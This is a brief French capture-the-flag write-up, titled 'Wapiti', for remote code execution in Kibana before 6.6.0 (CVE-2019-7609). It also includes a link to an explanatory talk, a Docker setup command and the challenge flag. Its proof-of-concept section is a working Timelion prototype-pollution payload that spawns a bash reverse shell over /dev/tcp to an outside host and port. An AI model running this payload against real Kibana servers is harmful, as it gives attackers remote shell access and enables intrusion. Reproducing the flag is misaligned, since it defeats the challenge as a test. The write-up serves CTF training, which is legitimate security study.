# Wapiti
## Challenge

## Résolution

RCE sous Kibana < 6.6.0 (CVE-2019-7609)

**POC**

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

**Explication :** [https://slides.com/securitymb/prototype-pollution-in-kibana](https://slides.com/securitymb/prototype-pollution-in-kibana)

## Setup

```
docker-compose up --build -d
```

## Flag

```
PHACK{0p3n_Rc3_In_Kib4n4_i5_gR34t_p0w3r}
```